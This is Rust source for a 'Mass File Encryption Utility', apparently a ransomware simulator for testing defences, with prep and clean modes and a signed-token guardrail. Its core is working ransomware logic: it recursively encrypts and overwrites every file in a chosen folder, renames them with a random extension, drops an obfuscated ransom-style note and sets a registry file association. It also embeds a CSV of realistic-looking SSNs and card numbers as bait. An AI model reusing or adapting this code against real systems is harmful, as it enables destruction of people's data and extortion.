// Author: Jason Kelly
// Purpose: Mass File Encryption Utility
// Imports
// Standard Library
use std::io::{Read, Write};
use std::{env, fs::{File,rename,remove_dir_all}};
use std::path::{Path,PathBuf};
use std::fs::create_dir_all;
use std::thread::sleep;
use std::time::Duration;

// Home Directory
use dirs::home_dir;

// Base64 Decoding
use base64::prelude::*;

// AES Related Imports
use aes_gcm::aead::consts::U12;
use aes_gcm::aead::generic_array::GenericArray;
use aes_gcm::aead::rand_core::RngCore;
use ed25519_dalek::pkcs8::DecodePublicKey;
// Generating random things
use rand::{distr::Alphanumeric,Rng};

// Walking target directory for encryption
use walkdir::WalkDir;

// AEAD Algorithm
use aes_gcm::{Aes256Gcm, Key, Nonce, aead::{Aead,KeyInit,OsRng}};

// Web Request 
use reqwest::blocking::{get, Response};

// EDDSA Guardrails
use ed25519_dalek::{Signature,Verifier, VerifyingKey};
use pem::{Pem,parse};

// Object Serialization
use serde_json;
use serde::{Serialize,Deserialize};

// Writing AutoRun association to registry
#[cfg(target_os="windows")]
use winreg::{enums::*,RegKey};
#[cfg(target_os="windows")]
use windows::Win32::UI::Shell::{SHChangeNotify, SHCNE_ASSOCCHANGED, SHCNF_IDLIST};

//Runtime Configuration Struct
#[derive(Debug)]
struct RuntimeConfiguration {
	run_operation:bool,
	prep_operation:bool,
	extension:String,
	target_folder:String,
	note_required:bool,
}

// Unlock Struct
#[derive(Serialize, Deserialize)]
struct UnlockFile {
	message:String,
	signature:String,
}

// Global Variables
const WEB_URL:&str = "https://example.com/unlock.json";
const PUB_KEY:&str = "-----BEGIN PUBLIC KEY-----example_key-----END PUBLIC KEY-----";

// Argument Parser
fn parse_arguments(runtime_config:&mut RuntimeConfiguration,commandline_args:&Vec<String>) -> bool {
	let mut run_argument_provided:bool = false;
	let mut target_folder_argument_provided:bool = false;
	let mut extension_provided:bool = false;
	for (position,argument) in commandline_args.iter().enumerate() {
		let case_neutral_argument:String = argument.to_lowercase();
		// Run Operation
		if case_neutral_argument == "run" || case_neutral_argument == "clean" || case_neutral_argument == "prep" {
			run_argument_provided = true;
			if case_neutral_argument == "run" {
				runtime_config.run_operation = true;
			}
			else if case_neutral_argument == "clean" {
				runtime_config.run_operation = false;
			}
			else if case_neutral_argument == "prep" {
				runtime_config.prep_operation = true;
			}
		}
		if case_neutral_argument == "-t" {
			if commandline_args.len()-1 >= position+1 {
				runtime_config.target_folder=String::from(commandline_args[position+1].as_str());
				target_folder_argument_provided=true;
			}
			else {
				println!("Please supply a value for the target directory!");
				return false;
			}
		}
		if case_neutral_argument == "-e" {
			if commandline_args.len()-1 >= position+1 {
				runtime_config.extension=String::from(commandline_args[position+1].as_str());
				extension_provided = true;
			}
			else {
				println!("Please supply a value for the file extension!");
				return false;
			}
		}
		if case_neutral_argument == "-r" {
			if commandline_args.len()-1 >= position+1 {
				let note:String = String::from(commandline_args[position+1].as_str());
				if note.to_lowercase() == "false" {
					runtime_config.note_required=false;
				}
				else if note.to_lowercase() == "true" {
					runtime_config.note_required=true;
				}
				else {
					println!("Please supply a true/false for the note drop!");
					return false;
				}
			}
			else {
				println!("Please supply a true/false for the note drop!");
				return false;
			}
		}
	}
	if !((run_argument_provided && target_folder_argument_provided) || (!runtime_config.run_operation && extension_provided && target_folder_argument_provided)) {
		println!("Please review your arguments and make sure you provide all required values!");
		print_help();
		return false;
	}
	return true;
}

// Argument Validator
fn validate_arguments(runtime_config:&RuntimeConfiguration) -> bool {
	// Extension
	if !runtime_config.extension.chars().all(char::is_alphanumeric) {
		println!("Please provide a valid file extension which is all alphanumeric!");
		print_help();
		return false;
	}
	if !Path::new(runtime_config.target_folder.as_str()).exists() {
		println!("Please provide a valid file path and ensure it is writeable in the current context!");
		print_help();
		return false;
	}
	return true;
}

// Preparation Function
fn prep(target_folder:&String) -> bool {
	let  base_folder:PathBuf = PathBuf::from(target_folder);
	let width:i8 = 8;
	let deep:i8 = 4;
	let file_limit:i8 = 12;
	let mut files_created:i32 = 0;
	let mut folders_created:i32 = 0;

	if !create_folders(base_folder, width, deep, file_limit, &mut files_created, &mut folders_created) {
		println!("Failed to prepare directory structure!");
		return false
	}
	println!("Folders created: {}\nFiles Created: {}\n",folders_created,files_created);
	
	return true;
}
fn create_folders(base_path:PathBuf, width:i8, depth:i8, file_limit:i8, file_count:&mut i32, folder_count:&mut i32) -> bool {
	// Create files here regardless
	if !create_files(&base_path, file_limit, file_count) {
		println!("Failed to create files in the folder during prep!");
		return false;
	}
	// Since decrement is done, we're done depth wise
	if depth==0 {
		return true;
	}
	for current_width in 0..width {
		//FORDEBUG: println!("Depth: {}\n Width: {}", depth, width);
		//create_files(&base_path.clone(), file_limit, file_count);
		let mut current_folder_path:PathBuf = base_path.clone();
		// Add the new folder on to the current path
		current_folder_path.push(format!("Folder {}", current_width));
		match create_dir_all(&current_folder_path) {
			Ok(_empty) => {*folder_count+=1}
			Err(e) => {println!("Failed to create folder during prep: {}", e); return false}
		}
		// Recursive call to move to next depth
		if !create_folders(current_folder_path, width, depth-1, file_limit, file_count, folder_count) {
		 	println!("Failed to create folders during prep!");
		 	return false;
		}
	}
	return true;
}

// Create files
fn create_files(folder:&PathBuf,file_limit:i8, file_count:&mut i32) -> bool {
	let text_file_contents:String = String::from("These are some very important business documents! Hope no one alters them in any way!");
	let csv_file_contents:String = String::from("SSN,gender,birthdate,maiden name,last name,first name,address,city,state,zip,phone,email,cc_type,CCN,cc_cvc,cc_expiredate\n172-32-1176,m,4/21/1958,Smith,White,Johnson,10932 Bigge Rd,Menlo Park,CA,94025,408 496-7223,jwhite@domain.com,m,5270-4267-6450-5516,123,25/06/2010\n514-14-8905,f,12/22/1944,Amaker,Borden,Ashley,4469 Sherman Street,Goff,KS,66428,785-939-6046,aborden@domain.com,m,5370-4638-8881-3020,713,01/02/2011\n213-46-8915,f,4/21/1958,Pinson,Green,Marjorie,309 63rd St. #411,Oakland,CA,94618,415 986-7020,mgreen@domain.com,v,4916-9766-5240-6147,258,25/02/2009\n524-02-7657,m,3/25/1962,Hall,Munsch,Jerome,2183 Roy Alley,Centennial,CO,80112,303-901-6123,jmunsch@domain.com,m,5180-3807-3679-8221,612,01/03/2010\n489-36-8350,m,06/09/1964,Porter,Aragon,Robert,3181 White Oak Drive,Kansas City,MO,66215,816-645-6936,raragon@domain.com,v,4929-3813-3266-4295,911,01/12/2011\n514-30-2668,f,27/05/1986,Nicholson,Russell,Jacki,3097 Better Street,Kansas City,MO,66215,913-227-6106,jrussell@domain.com,a,3.4539E+14,232,01/01/2010\n505-88-5714,f,23/09/1963,Mcclain,Venson,Lillian,539 Kyle Street,Wood River,NE,68883,308-583-8759,lvenson@domain.com,d,3.02049E+13,471,01/12/2011\n690-05-5315,m,02/10/1969,Kings,Conley,Thomas,570 Nancy Street,Morrisville,NC,27560,919-656-6779,tconley@domain.com,v,4916 4811 5814 8111,731,01/10/2010\n646-44-9061,M,12/01/1978,Kurtz,Jackson,Charles,1074 Small Street,New York,NY,10011,212-847-4915,cjackson@domain.com,m,5218 0144 2703 9266,892,01/11/2011\n421-37-1396,f,09/04/1980,Linden,Davis,Susan,4222 Bedford Street,Jasper,AL,35501,205-221-9156,sdavis@domain.com,v,4916 4034 9269 8783,33,01/04/2011\n461-97-5660,f,04/01/1975,Kingdon,Watson,Gail,3414 Gore Street,Houston,TX,77002,713-547-3414,gwatson@domain.com,v,4532 1753 6071 1112,694,01/09/2011\n660-03-8360,f,11/07/1953,Onwunli,Garrison,Lisa,515 Hillside Drive,Lake Charles,LA,70629,337-965-2982,lgarrison@domain.com,v,4539 5385 7425 5825,680,01/06/2011\n751-01-2327,f,16/02/1968,Simpson,Renfro,Julie,4032 Arron Smith Drive,Kaunakakai,HI,96748,808-560-1638,jrenfro@domain.com,m,5325 3256 9519 6624,238,01/03/2009\n559-81-1301,m,20/01/1952,Mcafee,Heard,James,2865 Driftwood Road,San Jose,CA,95129,408-370-0031,jheard@domain.com,v,4532 4220 6922 9909,311,01/09/2010\n624-84-9181,m,16/01/1980,Frazier,Reyes,Danny,3500 Diane Street,San Luis Obispo,CA,93401,805-369-0464,dreyes@domain.com,v,4532 0065 1968 5602,713,01/11/2009\n449-48-3135,m,14/06/1982,Feusier,Hall,Mark,4986 Chapel Street,Houston,TX,77077,281-597-5517,mhall@domain.com,v,4556 0072 1294 7415,953,01/05/2010\n477-36-0282,m,10/03/1961,Vasquez,Mceachern,Monte,456 Oral Lake Road,Minneapolis,MN,55401,952-412-3707,mmceachern@domain.com,m,5527 1247 5046 7780,889,01/03/2009\n458-02-6124,m,20/09/1955,Pennebaker,Diaz,Christopher,582 Thrash Trail,Dallas,TX,75247,903-624-9156,cdiaz@domain.com,m,5299 1561 5689 1938,584,01/08/2011\n044-34-6954,m,28/05/1967,Simpson,Lowe,Tim,1620 Maxwell Street,East Hartford,CT,6108,860-755-0293,tlowe@domain.com,m,5144 8691 2776 1108,616,01/10/2011\n587-03-2682,f,24/10/1958,Dickerson,Oyola,Lynette,2489 O Conner Street,Pascagoula,MS,39567,228-938-2056,loyola@domain.com,v,4532 9929 3036 9308,991,01/07/2011\n421-90-3440,f,17/07/1953,Kroeger,Morrison,Adriane,4696 Retreat Avenue,Birmingham,AL,35209,205-276-1807,amorrison@domain.com,v,4539 0031 3703 0728,322,01/12/2009\n451-80-3526,m,09/06/1950,Parmer,Santos,Thomas,173 Lunetta Street,Fort Worth,TX,76104,940-859-1393,tsantos@domain.com,v,4716 6984 4983 6160,767,01/09/2011\n300-62-3266,m,10/02/1965,Spain,Faulkner,Victor,1843 Olive Street,Toledo,OH,43602,419-340-3832,vfaulkner@domain.com,m,5548 0246 6336 5664,276,01/02/2010\n322-84-2281,m,19/08/1977,Miley,Iorio,Albert,4899 University Hill Road,Springfield,IL,62701,217-615-6419,aiorio@domain.com,v,4916 6734 7572 5015,347,01/02/2010\n465-73-5022,f,20/06/1964,Summers,Kaminski,Teresa,1517 Gambler Lane,Houston,TX,77006,281-906-2148,tkaminski@domain.com,m,5399 0706 4128 0178,721,01/10/2009\n612-20-6832,m,18/08/1979,Banas,Edwards,Rick,4254 Walkers Ridge Way,Gardena,CA,90248,626-991-3620,redwards@domain.com,m,5293 8502 0071 3058,701,01/08/2010\n687-05-8365,f,24/05/1976,Robbins,Peacock,Stacey,3396 Nancy Street,Raleigh,NC,27612,919-571-2339,speacock@domain.com,m,5495 8602 4508 6804,436,01/02/2011\n205-52-0027,f,26/03/1950,Sanford,Nelson,Agnes,4213 High Meadow Lane,Avoca,PA,18641,570-480-8704,anelson@domain.com,m,5413 4428 0145 0036,496,01/02/2010\n404-12-2154,f,21/09/1984,Garcia,Townsend,Mireille,2877 Glen Street,Paducah,KY,42003,270-408-7254,mtownsend@domain.com,v,4539 8219 0484 7598,710,01/03/2011\n151-32-2558,f,19/11/1952,Stockdale,Zwick,Rebecca,784 Beechwood Avenue,Piscataway,NJ,8854,908-814-6733,rzwick@domain.com,v,5252 5971 4219 4116,173,01/02/2011");
	let mut current_folder:PathBuf = folder.clone();
	let mut file_contents:String;
	for file_number in 0..file_limit {
		if file_number < (file_limit/2) {
			current_folder.push(format!("File{}.txt",file_number));
			file_contents=text_file_contents.clone();
		}
		else {
			current_folder.push(format!("File{}.csv",file_number));
			file_contents=csv_file_contents.clone();
		}
		let mut current_file:File;
		match File::create(current_folder.as_os_str()) {
			Ok(file) => {current_file = file}
			Err(e) => {println!("Failed to create file during prep: {}", e); return false}
		}
		match current_file.write(file_contents.as_bytes()) {
			Ok(_empty) => {},
			Err(e) => {println!("Failed to write to file during prep: {}", e); return false}
		}
		*file_count+=1;
		current_folder.pop();
	}
	return true;
}


// Encrypt Target
fn encrypt(runtime_config:&RuntimeConfiguration, enc_file_count:&mut i32) -> bool {
	// Sleepy time
	sleep(Duration::from_secs(60));
	// Initialise our encryption key and nonce arrays to 0 values
	let mut enc_key_bytes:[u8;32] = [0u8;32];
	let mut nonce_bytes:[u8;12] = [0u8;12];
	
	// Generate our encryption key using random bytes
	OsRng.fill_bytes(&mut enc_key_bytes);
	let key = Key::<Aes256Gcm>::from_slice(&enc_key_bytes);

	// Generate our Nonce using random bytes
	OsRng.fill_bytes(&mut nonce_bytes);
	let nonce:&GenericArray<u8,U12> = Nonce::from_slice(&nonce_bytes);

	for entry in WalkDir::new(runtime_config.target_folder.as_str()).into_iter().filter_map(|e| e.ok()) {
		if !entry.file_type().is_file() {
			continue;
		}
		//println!("{}", entry.path().display());
		// Try opening the file
		let mut input_file:File;
		let input_file_result = File::options().read(true).open(entry.path());
		match input_file_result {
			Ok(input) => input_file = input,
			Err(error) => {println!("Error Opening File: {}", error); continue;},
		}

		//Try reading the file
		let mut input_file_data:Vec<u8> = Vec::new();
		match input_file.read_to_end(&mut input_file_data) {
			Ok(_input_data) => {},
			Err(e) => {println!("Failed to read file data: {}", e); continue}
		}
		// Initialise our AEAD cipher and encrypt
		let cipher:Aes256Gcm = Aes256Gcm::new(key);
		let encrypted_file_data:Vec<u8> = cipher.encrypt(nonce, input_file_data.as_ref()).expect("Encryption error encountered!");
		
		// Put Nonce at beginning (AEAD common practice)
		let mut data_to_write:Vec<u8> = Vec::new();
		data_to_write.extend_from_slice(&nonce);
		data_to_write.extend(encrypted_file_data);
		
		// Open file and overwrite everything
		let output_file_result = File::options().read(true).write(true).truncate(true).open(entry.path());
		let mut output_file:File;
		match output_file_result {
			Ok(out_file) => {output_file = out_file;},
			Err(e) => {println!("Error opening file to write encrypted data: {}",e);continue}
		}
		match output_file.write_all(&data_to_write) {
			Ok(_output) => {},
			Err(e) => {println!("Error writing encrypted data to file: {}",e);continue}
		}
		let new_file_name:String = entry.path().to_str().expect("Dont know why we cant get a string back here in new file name declaration!").to_string() + "." + &runtime_config.extension;
		let rename_result = rename(entry.path(),new_file_name);
		match rename_result {
			Ok(_o) => {*enc_file_count+=1},
			Err(e) => {println!("Error renaming file: {}",e);break}
		}
	}
	println!("\n\n\n\nEncryption Key Used: {}\nNonce Used: {}\nExtension Used: {}", hex::encode(enc_key_bytes), hex::encode(nonce_bytes), runtime_config.extension);
	if runtime_config.note_required {
		if !create_note() {
			println!("Failed to create note on the desktop!");
			return false;
		}
	}
	return true;
}

// Create Note
fn create_note() -> bool {
	let mut desktop_note_path:PathBuf;
	match home_dir(){
		Some(path) => {desktop_note_path = path}
		None => {println!("Error getting the users home directory!"); return false;}
	}
	desktop_note_path.push("Desktop");
	desktop_note_path.push("Note.txt");
	let mut note:File;
	match File::create(desktop_note_path.as_os_str()) {
		Ok(file) => {note = file}
		Err(e) => {println!("Failed to create file during prep: {}", e); return false}
	}
	let note_contents:String = String::from("WU9VUiBGSUxFUyBBUkUgTk9XIEVOQ1JZUFRFRCEgSEFWRSBGVU4gVFJZSU5HIFRPIEdFVCBUSEVNIEJBQ0sh");
	let mut decoded_note_contents:String = String::from("");
	match BASE64_STANDARD.decode(note_contents.as_bytes()) {
		Ok(decoded_bytes) => {
			match String::from_utf8(decoded_bytes) {
				Ok(decoded) => {decoded_note_contents = decoded}
				Err(e) => {println!("Failed to convert from bytes to UTF-8 string: {}",e)}
			}
		},
		Err(e) => {println!("Failed to decode Base64 string: {}",e); return false}
	}
	match note.write(decoded_note_contents.as_bytes()) {
		Ok(_empty) => {},
		Err(e) => {println!("Failed to write to file during prep: {}", e); return false}
	}
	return true;
}

// Clean up
fn clean(runtime_config:&RuntimeConfiguration) -> bool {
	// Delete target folder
	match remove_dir_all(runtime_config.target_folder.clone()) {
		Ok(_o) => {},
		Err(e) => {println!("Error cleaning up the target folder: {}", e); return false}
	}
	// Delete Autorun Association
	#[cfg(target_os="windows")]
	if !delete_autorun(runtime_config.extension.clone()){
		return false;
	}
	return true
}

// Autorun Association
// https://stackoverflow.com/a/28585998
#[cfg(target_os = "windows")]
fn write_autorun(file_extension:String, note:bool) -> bool {
	// Open HKCU Key
	let hkcu_key:RegKey = RegKey::predef(HKEY_CURRENT_USER);
	// Open SOFTWARE\\Classes Subkey
	let software_classes_key:RegKey = hkcu_key.open_subkey("SOFTWARE\\Classes").expect("Should have been able to open the HKCU\\SOFTWARE\\Classes key! Not sure what happened!");
	// Create Key from our Extension
	let extension_key:RegKey;
	match software_classes_key.create_subkey(".".to_string() + &file_extension) {
		Ok(key_disposition_tuple) => {extension_key = key_disposition_tuple.0},
		Err(e) => {println!("Error creating extension subkey in registry: {}",e); return false}
	}
	// Set Value for that key to be "MFE"
	match extension_key.set_value("", &"MFE".to_string()) {
		Ok(_empty) => {},
		Err(e) => {println!("Failed to set value of extension subkey in registry: {}", e)}
	}
	// Create MFE Key to autorun on encrypted files
	let command_key:RegKey;
	match hkcu_key.create_subkey("SOFTWARE\\Classes\\MFE\\shell\\open\\command") {
		Ok(key_disposition_tuple) => {command_key = key_disposition_tuple.0},
		Err(e) => {println!("Failed to create Shell\\open\\command subkey: {}", e); return false;}
	}
	if !note {
		match command_key.set_value("", &"C:\\Windows\\System32\\calc.exe") {
			Ok(_empty) => {},
			Err(e) => {println!("Failed to set value of Shell\\open\\command subkey: {}", e)}
		}
	}
	else {
		match command_key.set_value("", &"C:\\Windows\\System32\\notepad.exe %USERPROFILE%\\Desktop\\note.txt") {
			Ok(_empty) => {},
			Err(e) => {println!("Failed to set value of Shell\\open\\command subkey: {}", e)}
		}
	}
	unsafe {
		//https://stackoverflow.com/a/2697804
        SHChangeNotify(SHCNE_ASSOCCHANGED, // Event ID for association change
            SHCNF_IDLIST,       // Flags indicating the type of dwItem1
            None,               // Pointer to the first item (not used here)
            None,               // Pointer to the second item (not used here)
        );
	}
	return true;
}

// Delete AutoRun Association
#[cfg(target_os="windows")]
fn delete_autorun(file_extension:String) -> bool {
	// Open HKCU Key
	let hkcu_key:RegKey = RegKey::predef(HKEY_CURRENT_USER);
	match hkcu_key.delete_subkey_all("SOFTWARE\\Classes\\.".to_string() + &file_extension) {
		Ok(_empty) => {},
		Err(e) => {println!("Failed to delete file extension registry key: {}", e); return false}
	}
	match hkcu_key.delete_subkey_all("SOFTWARE\\Classes\\MFE") {
		Ok(_empty) => {},
		Err(e) => {println!("Failed to delete MFE program subkey: {}",e); return false}
	}
	return true;
}

// Print Help Function
fn print_help() {
	println!(r#"Usage: mfe.exe {{run/clean/prep}} -t {{target_folder}} {{-e extension}} {{-r true}}
	-t : Folder to use
	-e : Extension to use (optional argument)
	-r : Leave a note (optional argument)"#);
}

// Uncover Executable
fn open_exe(web_url: String) -> bool {
	let mut content_response:Response = get(web_url).expect("Should have been able to get file, exiting!");
	let mut content:String = String::from("");
	match content_response.read_to_string(&mut content) {
		Ok(_size) => {},
		Err(e) => {println!("Failed to read contents to string: {}",e); return false}
	}
	let parsed_response:UnlockFile;
	match serde_json::from_str(&content) {
		Ok(parsed) => {parsed_response = parsed},
		Err(e) => {println!("Failed to parse response message, please ensure you hosted the correct JSON and have not altered it! {}",e); return false}
	}
	let parsed_pem:Pem;
	match parse(PUB_KEY.trim()) {
		Ok(pem) => {parsed_pem=pem},
		Err(e) => {println!("Failed to parse provided pem, please ensure it is formatted correctly! {}", e); return false}
	}
	if parsed_pem.tag() != "PUBLIC KEY" {
		println!("Please provide a public key PEM object not anything else!");
		return false;
	}
	let verifier:VerifyingKey;
	match VerifyingKey::from_public_key_der(&parsed_pem.contents()) {
		Ok(key) => {verifier=key},
		Err(e) => {println!("Failed to create a VerifyingKey from the supplied public key, please ensure it is of type ED25519: {}", e); return false}
	}
	let signature_base64_bytes:Vec<u8>;
	match BASE64_STANDARD.decode(&parsed_response.signature.as_bytes()) {
		Ok(bytes) => {signature_base64_bytes = bytes},
		Err(e) => {println!("Failed to decode the base64 signature from the JSON parsed from the server, please ensure it has not been altered since or before hosting! {}", e); return false}
	}
	let signature:Signature;
	match Signature::try_from(&signature_base64_bytes[..]) {
		Ok(sig) => {signature=sig},
		Err(e) => {println!("Failed to create signature object from bytes! Not sure what's happening: {}", e); return false}
	}
	match verifier.verify(&parsed_response.message.as_bytes(), &signature) {
		Ok(_empty) => {},
		Err(e) => {println!("Failed to validate signature provided in the JSON using the hardcoded public key, please recompile this executable with a fresh run of token_signer! {}", e);	return false}
	}
	return true;
}

// Main Function
fn main() {
	if !(open_exe(WEB_URL.to_string())) {
		println!("Failed");
		return;
	}
	let mut runtime_config:RuntimeConfiguration = RuntimeConfiguration {
		run_operation:true,
		prep_operation:false,
		extension: rand::rng().sample_iter(&Alphanumeric).take(5).map(char::from).collect(),
		target_folder: String::from("C:\\Windows\\Temp"),
		note_required: false,
	};
	let args:Vec<String> = env::args().collect();
	//print_help();
	if !parse_arguments(&mut runtime_config, &args) {
		dbg!(runtime_config);
		return;
	}
	if !validate_arguments(&runtime_config) {
		dbg!(runtime_config);
		return;
	}
	if runtime_config.prep_operation {
		if !prep(&runtime_config.target_folder) {
			dbg!(runtime_config);
			return;
		}
		return;
	}
	if runtime_config.run_operation {
		let mut enc_file_count:i32 = 0;
		if !encrypt(&runtime_config,&mut enc_file_count) {
			dbg!(runtime_config);
			return;
		}
		println!("File Encrypted: {}", enc_file_count);
		#[cfg(target_os="windows")]
		if !write_autorun(runtime_config.extension.clone(), runtime_config.note_required) {
			dbg!(runtime_config);
			return;
		}
	}
	else {
		if !clean(&runtime_config) {
			dbg!(runtime_config);
			return;
		}
	}
}
